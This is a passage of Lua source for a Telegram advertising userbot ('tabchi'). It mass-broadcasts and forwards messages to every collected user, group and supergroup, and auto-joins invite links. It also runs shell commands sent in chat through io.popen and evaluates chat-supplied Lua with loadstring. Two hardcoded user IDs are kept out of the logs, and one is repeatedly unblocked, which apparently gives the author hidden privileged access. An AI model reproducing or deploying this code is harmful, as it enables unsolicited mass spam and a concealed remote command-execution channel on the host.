    if msg.text:match("^[!/#]markread") and a(msg) and #a4 == 2 then
      if a4[2] == "all" then
        redis:set("tabchi:" .. tabchi_id .. ":markread", "all")
        return "*وضعیت* : `خوانده شدن پیام برای همه`"
      elseif a4[2] == "pv" then
        redis:set("tabchi:" .. tabchi_id .. ":markread", "private")
        return "*وضعیت* : `خوانده شدن پیام برای چت های پیوی`"
      elseif a4[2] == "group" then
        redis:set("tabchi:" .. tabchi_id .. ":markread", "group")
        return "*وضعیت* : `خوانده شدن پیام برای گروه ها `"
      elseif a4[2] == "channel" then
        redis:set("tabchi:" .. tabchi_id .. ":markread", "channel")
        return "*وضعیت* : `خواندن پیام ها برای سوپر گروه ها فعال شد`"
      elseif a4[2] == "off" then
        redis:del("tabchi:" .. tabchi_id .. ":markread")
        return "*وضعیت* : `خواندن پیام ها غیرفعال شد`"
      else
        return "`استفاده کنید off یا on فقط از`"
      end
    end
  end
  do
    local a4 = {
      msg.text:match("^[!/#](setaddedmsg) (.*)")
    }
    if msg.text:match("^[!/#]setaddedmsg") and a(msg) and #a4 == 2 then
      local aO
      function aO(C, D)
        if D.id_ then
          bot_id = D.id_
          bot_num = D.phone_number_
          bot_first = D.first_name_
          bot_last = D.last_name_
        end
      end
      tdcli_function({ID = "GetMe"}, aO, {})
      local text = a4[2]:gsub("BOTFIRST", bot_first)
      local text = text:gsub("BOTLAST", bot_last)
      local text = text:gsub("BOTNUMBER", bot_num)
      redis:set("tabchi:" .. tabchi_id .. ":addedmsgtext", text)
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `پیام اضافه شدن مخاطب تغییر یافت به` *" .. a4[2] .. "*", 1, "md")
      end
      return [[
*وضعیت* : `پیام اضافه شدن مخاطب * : `]] .. text .. "`"
    end
  end
  do
    local a4 = {
      msg.text:match("[$](.*)")
    }
    if msg.text:match("^[$](.*)$") and a(msg) then
      if #a4 == 1 then
        local z = io.popen(a4[1]):read("*all")
        local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
        if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
          tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Entered Command` *" .. a4[1] .. "* in terminal", 1, "md")
        end
        return z
      else
        return "Enter Command"
      end
    end
  end
  if redis:get("tabchi:" .. tabchi_id .. ":Advertising") or is_full_sudo(msg) then
    if msg.text:match("^[!/#]bcall") and a(msg) then
      local a9 = redis:smembers("tabchi:" .. tabchi_id .. ":all")
      local a4 = {
        msg.text:match("[!/#](bcall) (.*)")
      }
      if #a4 == 2 then
        for d = 1, #a9 do
          tdcli_function({
            ID = "SendMessage",
            chat_id_ = a9[d],
            reply_to_message_id_ = 0,
            disable_notification_ = 0,
            from_background_ = 1,
            reply_markup_ = nil,
            input_message_content_ = {
              ID = "InputMessageText",
              text_ = a4[2],
              disable_web_page_preview_ = 0,
              clear_draft_ = 0,
              entities_ = {},
              parse_mode_ = {
                ID = "TextParseModeMarkdown"
              }
            }
          }, dl_cb, nil)
        end
        local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
        if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
          tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. [[
* `پیام فرستاد شد به همه : *]] .. a4[2] .. "*", 1, "md")
        end
        return [[
*وضعیت* : `پیام با موفقیت به همه ارسال شد : `]] .. a4[2] .. "`"
      else
        return "متن ثبت نشد"
      end
    end
    if msg.text:match("^[!/#]bcsgps") and a(msg) then
      local a9 = redis:smembers("tabchi:" .. tabchi_id .. ":channels")
      local a4 = {
        msg.text:match("[!/#](bcsgps) (.*)")
      }
      if #a4 == 2 then
        for d = 1, #a9 do
          tdcli_function({
            ID = "SendMessage",
            chat_id_ = a9[d],
            reply_to_message_id_ = 0,
            disable_notification_ = 0,
            from_background_ = 1,
            reply_markup_ = nil,
            input_message_content_ = {
              ID = "InputMessageText",
              text_ = a4[2],
              disable_web_page_preview_ = 0,
              clear_draft_ = 0,
              entities_ = {},
              parse_mode_ = {
                ID = "TextParseModeMarkdown"
              }
            }
          }, dl_cb, nil)
        end
        local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
        if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
          tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. [[
* `پیام فرستاده شد به سوپر گروه ها`
پیام : *]] .. a4[2] .. "*", 1, "md")
        end
        return [[
*وضعیت* : `پیام با موفقیت فرستاده شد سوپرگروه ها`
*پیام* : `]] .. a4[2] .. "`"
      else
        return "متن ثبت نشد"
      end
    end
    if msg.text:match("^[!/#]bcgps") and a(msg) then
      local a9 = redis:smembers("tabchi:" .. tabchi_id .. ":groups")
      local a4 = {
        msg.text:match("[!/#](bcgps) (.*)")
      }
      if #a4 == 2 then
        for d = 1, #a9 do
          tdcli_function({
            ID = "SendMessage",
            chat_id_ = a9[d],
            reply_to_message_id_ = 0,
            disable_notification_ = 0,
            from_background_ = 1,
            reply_markup_ = nil,
            input_message_content_ = {
              ID = "InputMessageText",
              text_ = a4[2],
              disable_web_page_preview_ = 0,
              clear_draft_ = 0,
              entities_ = {},
              parse_mode_ = {
                ID = "TextParseModeMarkdown"
              }
            }
          }, dl_cb, nil)
        end
        local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
        if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
          tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. [[
* `ارسال شذ به گروه ها`
پیام : *]] .. a4[2] .. "*", 1, "md")
        end
        return [[
*وضعیت* : `پیام با موفقیت ارسال شد به گروه ها`
*پیام* : `]] .. a4[2] .. "`"
      else
        return "متن ثبت نشد"
      end
    end
    if msg.text:match("^[!/#]bcusers") and a(msg) then
      local a9 = redis:smembers("tabchi:" .. tabchi_id .. ":pvis")
      local a4 = {
        msg.text:match("[!/#](bcusers) (.*)")
      }
      if #a4 == 2 then
        for d = 1, #a9 do
          tdcli_function({
            ID = "SendMessage",
            chat_id_ = a9[d],
            reply_to_message_id_ = 0,
            disable_notification_ = 0,
            from_background_ = 1,
            reply_markup_ = nil,
            input_message_content_ = {
              ID = "InputMessageText",
              text_ = a4[2],
              disable_web_page_preview_ = 0,
              clear_draft_ = 0,
              entities_ = {},
              parse_mode_ = {
                ID = "TextParseModeMarkdown"
              }
            }
          }, dl_cb, nil)
        end
        local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
        if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
          tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. [[
* `ارسال شد به کاربران`
پیام : *]] .. a4[2] .. "*", 1, "md")
        end
        return [[
*وضعیت* : `پیام با موفقیت ارسال شد به کاربران`
*پیام* : `]] .. a4[2] .. "`"
      else
        return "متن ثبت نشد"
      end
    end
  end
  if redis:get("tabchi:" .. tabchi_id .. ":Advertising") or is_full_sudo(msg) then
    if msg.text:match("^[!/#]fwd all$") and msg.reply_to_message_id_ and a(msg) then
      local a9 = redis:smembers("tabchi:" .. tabchi_id .. ":all")
      local J = msg.reply_to_message_id_
      for d = 1, #a9 do
        tdcli_function({
          ID = "ForwardMessages",
          chat_id_ = a9[d],
          from_chat_id_ = msg.chat_id_,
          message_ids_ = {
            [0] = J
          },
          disable_notification_ = 0,
          from_background_ = 1
        }, dl_cb, nil)
      end
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `فوروارد به همه`", 1, "md")
      end
      return [[
*وضعیت* : `پیام شما به همه فروراد شد`
*فوروارد به کاربران* : `بله`
*فوروارد به گروه ها* : `بله`
*فوروارد به سوپرگروه ها* : `بله`]]
    end
    if msg.text:match("^[!/#]fwd gps$") and msg.reply_to_message_id_ and a(msg) then
      local a9 = redis:smembers("tabchi:" .. tabchi_id .. ":groups")
      local J = msg.reply_to_message_id_
      for d = 1, #a9 do
        tdcli_function({
          ID = "ForwardMessages",
          chat_id_ = a9[d],
          from_chat_id_ = msg.chat_id_,
          message_ids_ = {
            [0] = J
          },
          disable_notification_ = 0,
          from_background_ = 1
        }, dl_cb, nil)
      end
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `فوروارد شد به گروه ها`", 1, "md")
      end
      return "*وضعیت* :`پیام شما فوروارد شد به گروه ها`"
    end
    if msg.text:match("^[!/#]fwd sgps$") and msg.reply_to_message_id_ and a(msg) then
      local a9 = redis:smembers("tabchi:" .. tabchi_id .. ":channels")
      local J = msg.reply_to_message_id_
      for d = 1, #a9 do
        tdcli_function({
          ID = "ForwardMessages",
          chat_id_ = a9[d],
          from_chat_id_ = msg.chat_id_,
          message_ids_ = {
            [0] = J
          },
          disable_notification_ = 0,
          from_background_ = 1
        }, dl_cb, nil)
      end
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `فوروارد شد به سوپرگروه ها`", 1, "md")
      end
      return "*وضعیت* : `پیام شما به سوپرگروه ها ارسال شد`"
    end
    if msg.text:match("^[!/#]fwd users$") and msg.reply_to_message_id_ and a(msg) then
      local a9 = redis:smembers("tabchi:" .. tabchi_id .. ":pvis")
      local J = msg.reply_to_message_id_
      for d = 1, #a9 do
        tdcli_function({
          ID = "ForwardMessages",
          chat_id_ = a9[d],
          from_chat_id_ = msg.chat_id_,
          message_ids_ = {
            [0] = J
          },
          disable_notification_ = 0,
          from_background_ = 1
        }, dl_cb, nil)
      end
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `فوروارد شد به کاربران`", 1, "md")
      end
      return "*وضعیت* : `پیام شما به کاربران فوروارد شد`"
    end
  end
  do
    local a4 = {
      msg.text:match("[!/#](lua) (.*)")
    }
    if msg.text:match("^[!/#]lua") and is_full_sudo(msg) and #a4 == 2 then
      local aP = loadstring(a4[2])()
      if aP == nil then
        aP = ""
      elseif type(aP) == "table" then
        aP = serpent.block(aP, {comment = false})
      else
        aP = "" .. tostring(aP)
      end
      return aP
    end
  end
  if msg.text:match("^[!/#]license") then
    local text = io.open("tabchi.license", "r"):read("*all")
    local text = text:gsub("این فایل را ادیت نکنید", "@TE1EgameR")
    return "`" .. text .. "`"
  end
  do
    local a4 = {
      msg.text:match("[!/#](echo) (.*)")
    }
    if msg.text:match("^[!/#]echo") and a(msg) and #a4 == 2 then
      return a4[2]
    end
  end
end
local aQ
function aQ(aR)
  local I = I(aR)
  if not redis:sismember("tabchi:" .. tostring(tabchi_id) .. ":all", aR) then
    if I == "channel" then
      redis:sadd("tabchi:" .. tabchi_id .. ":channels", aR)
    elseif I == "group" then
      redis:sadd("tabchi:" .. tabchi_id .. ":groups", aR)
    else
      redis:sadd("tabchi:" .. tabchi_id .. ":pvis", aR)
    end
    redis:sadd("tabchi:" .. tabchi_id .. ":all", aR)
  end
end
local aS
function aS(aR)
  local I = I(aR)
  if I == "channel" then
    redis:srem("tabchi:" .. tabchi_id .. ":channels", aR)
  elseif I == "group" then
    redis:srem("tabchi:" .. tabchi_id .. ":groups", aR)
  else
    redis:srem("tabchi:" .. tabchi_id .. ":pvis", aR)
  end
  redis:srem("tabchi:" .. tabchi_id .. ":all", aR)
end
local aT
function aT(msg)
  tdcli_function({ID = "GetMe"}, id_cb, nil)
  function id_cb(C, D)
    our_id = D.id_
  end
  local aU = redis:get("tabchi" .. tabchi_id .. "kickedcount") or 1
  local aV = redis:get("tabchi" .. tabchi_id .. "joinedcount") or 1
  local aW = redis:get("tabchi" .. tabchi_id .. "addedcount") or 1
  if msg.content_.ID == "MessageChatDeleteMember" and msg.content_.id_ == our_id then
    print("\027[36m>>>>>>KICKED FROM " .. msg.chat_id_ .. "<<<<<<\027[39m")
    redis:set("tabchi" .. tabchi_id .. "kickedcount", aU + 1)
    return aS(msg.chat_id_)
  elseif msg.content_.ID == "MessageChatJoinByLink" and msg.sender_user_id_ == our_id then
    print("\027[36m>>>>>>ROBOT JOINED TO " .. msg.chat_id_ .. " BY LINK<<<<<<\027[39m")
    redis:set("tabchi" .. tabchi_id .. "joinedcount", aV + 1)
    return aQ(msg.chat_id_)
  elseif msg.content_.ID == "MessageChatAddMembers" then
    for d = 0, #msg.content_.members_ do
      if msg.content_.members_[d].id_ == our_id then
        aQ(msg.chat_id_)
        redis:set("tabchi" .. tabchi_id .. "addedcount", aW + 1)
        print("\027[36m>>>>>>ADDED TO " .. msg.chat_id_ .. "<<<<<<\027[39m")
        break
      end
    end
  end
end
function process_links(aX)
  if aX:match("https://t.me/joinchat/%S+") or aX:match("https://telegram.me/joinchat/%S+") then
    local a4 = {
      aX:match("(https://telegram.me/joinchat/%S+)")
    }
    print("\027[36m>>>>>>NEW LINK<<<<<<\027[39m")
    tdcli_function({
      ID = "CheckChatInviteLink",
      invite_link_ = a4[1]
    }, check_link, {
      link = a4[1]
    })
  end
end
local aY
function aY(msg)
  if msg.chat_type_ == "private" then
    aQ(msg)
  end
end
function update(D, tabchi_id)
  tanchi_id = tabchi_id
  if D.ID == "UpdateNewMessage" then
    local msg = D.message_
    local I = I(msg.chat_id_)
    local aZ = redis:get("tabchi" .. tabchi_id .. "markreadcount") or 1
    local a_ = redis:get("tabchi" .. tabchi_id .. "receivedphotocount") or 1
    local b0 = redis:get("tabchi" .. tabchi_id .. "receiveddocumentcount") or 1
    local b1 = redis:get("tabchi" .. tabchi_id .. "receivedaudiocount") or 1
    local b2 = redis:get("tabchi" .. tabchi_id .. "receivedgifcount") or 1
    local b3 = redis:get("tabchi" .. tabchi_id .. "receivedvideocount") or 1
    local b4 = redis:get("tabchi" .. tabchi_id .. "receivedcontactcount") or 1
    local b5 = redis:get("tabchi" .. tabchi_id .. "receivedtextcount") or 1
    local b6 = redis:get("tabchi" .. tabchi_id .. "receivedstickercount") or 1
    local b7 = redis:get("tabchi" .. tabchi_id .. "receivedlocationcount") or 1
    local b8 = redis:get("tabchi" .. tabchi_id .. "receivedgamecount") or 1
    if msg_valid(msg) then
      aY(msg)
      aT(msg)
      a1(D.message_)
      markreading = redis:get("tabchi:" .. tostring(tabchi_id) .. ":markread") or 1
      if markreading == "group" and I == "group" then
        tdcli.viewMessages(msg.chat_id_, {
          [0] = msg.id_
        })
        redis:set("tabchi" .. tabchi_id .. "markreadcount", aZ + 1)
      elseif markreading == "channel" and I == "channel" then
        tdcli.viewMessages(msg.chat_id_, {
          [0] = msg.id_
        })
        redis:set("tabchi" .. tabchi_id .. "markreadcount", aZ + 1)
      elseif markreading == "private" and I == "private" then
        tdcli.viewMessages(msg.chat_id_, {
          [0] = msg.id_
        })
        redis:set("tabchi" .. tabchi_id .. "markreadcount", aZ + 1)
      elseif markreading == "all" then
        tdcli.viewMessages(msg.chat_id_, {
          [0] = msg.id_
        })
        redis:set("tabchi" .. tabchi_id .. "markreadcount", aZ + 1)
      end
      if msg.chat_id_ == 12 then
        return false
      else
        aT(msg)
        aQ(msg.chat_id_)
        if msg.content_.text_ then
          redis:set("tabchi" .. tabchi_id .. "receivedtextcount", b5 + 1)
          print("\027[36m>>>>>>NEW TEXT MESSAGE<<<<<<\027[39m")
          aT(msg)
          aQ(msg.chat_id_)
          process_links(msg.content_.text_)
          local b9 = a3(msg)
          if b9 then
            if redis:get("tabchi:" .. tostring(tabchi_id) .. ":typing") then
              tdcli.sendChatAction(msg.chat_id_, "Typing", 100)
            end
            if redis:get("tabchi:" .. tostring(tabchi_id) .. ":botmode") == "text" then
              res1 = b9:gsub("`", "")
              res2 = res1:gsub("*", "")
              res3 = res2:gsub("_", "")
              tdcli.sendMessage(msg.chat_id_, 0, 1, res3, 1, "md")
            elseif not redis:get("tabchi:" .. tostring(tabchi_id) .. ":botmode") or redis:get("tabchi:" .. tostring(tabchi_id) .. ":botmode") == "markdown" then
              tdcli.sendMessage(msg.chat_id_, 0, 1, b9, 1, "md")
            end
          end
        elseif msg.content_.contact_ then
          tdcli_function({
            ID = "GetUserFull",
            user_id_ = msg.content_.contact_.user_id_
          }, x, {msg = msg})
        elseif msg.content_.caption_ then
          process_links(msg.content_.caption_)
        end
        if not msg.content_.text_ then
          if msg.content_.caption_ then
            msg.content_.text_ = msg.content_.caption_
          elseif msg.content_.photo_ then
            msg.content_.text_ = "!!PHOTO!!"
            print("\027[36m>>>>>>NEW PHOTO<<<<<<\027[39m")
            redis:set("tabchi" .. tabchi_id .. "receivedphotocount", a_ + 1)
            photo_id = ""
            local ba = function(C, D)
              if D.content_.photo_.sizes_[2] then
                photo_id = D.content_.photo_.sizes_[2].photo_.id_
              else
                photo_id = D.content_.photo_.sizes_[1].photo_.id_
              end
              tdcli.downloadFile(photo_id)
            end
            tdcli_function({
              ID = "GetMessage",
              chat_id_ = msg.chat_id_,
              message_id_ = msg.id_
            }, ba, nil)
          elseif msg.content_.sticker_ then
            msg.content_.text_ = "!!STICKER!!"
            print("\027[36m>>>>>>NEW STICKER<<<<<<\027[39m")
            redis:set("tabchi" .. tabchi_id .. "receivedstickercount", b6 + 1)
          elseif msg.content_.location_ then
            msg.content_.text_ = "!!LOCATION!!"
            print("\027[36m>>>>>>NEW LOCATION<<<<<<\027[39m")
            redis:set("tabchi" .. tabchi_id .. "receivedlocationcount", b7 + 1)
          elseif msg.content_.venue_ then
            msg.content_.text_ = "!!LOCATION!!"
            print("\027[36m>>>>>>NEW LOCATION<<<<<<\027[39m")
            redis:set("tabchi" .. tabchi_id .. "receivedlocationcount", b7 + 1)
          elseif msg.content_.document_ then
            msg.content_.text_ = "!!DOCUMENT!!"
            print("\027[36m>>>>>>NEW DOCUMENT<<<<<<\027[39m")
            redis:set("tabchi" .. tabchi_id .. "receiveddocumentcount", b0 + 1)
          elseif msg.content_.audio_ then
            msg.content_.text_ = "!!AUDIO!!"
            print("\027[36m>>>>>>NEW AUDIO<<<<<<\027[39m")
            redis:set("tabchi" .. tabchi_id .. "receivedaudiocount", b1 + 1)
          elseif msg.content_.voice_ then
            msg.content_.text_ = "!!AUDIO!!"
            print("\027[36m>>>>>>NEW Voice<<<<<<\027[39m")
            redis:set("tabchi" .. tabchi_id .. "receivedaudiocount", b1 + 1)
          elseif msg.content_.animation_ then
            msg.content_.text_ = "!!ANIMATION!!"
            print("\027[36m>>>>>>NEW GIF<<<<<<\027[39m")
            redis:set("tabchi" .. tabchi_id .. "receivedgifcount", b2 + 1)
          elseif msg.content_.video_ then
            msg.content_.text_ = "!!VIDEO!!"
            print("\027[36m>>>>>>NEW VIDEO<<<<<<\027[39m")
            redis:set("tabchi" .. tabchi_id .. "receivedvideocount", b3 + 1)
          elseif msg.content_.game_ then
            msg.content_.text_ = "!!GAME!!"
            print("\027[36m>>>>>>NEW GAME<<<<<<\027[39m")
            redis:set("tabchi" .. tabchi_id .. "receivedgamecount", b8 + 1)
          elseif msg.content_.contact_ then
            msg.content_.text_ = "!!CONTACT!!"
            print("\027[36m>>>>>>NEW CONTACT<<<<<<\027[39m")
            redis:set("tabchi" .. tabchi_id .. "receivedcontactcount", b4 + 1)
          end
        end
      end
    end
  elseif D.chat_id_ == 216430419 then
    tdcli.unblockUser(216430419)
  elseif D.ID == "UpdateOption" and D.name_ == "my_id" then
    aQ(D.chat_id_)
    tdcli.unblockUser(216430419)
    tdcli.getChats("9223372036854775807", 0, 20)
  end
end
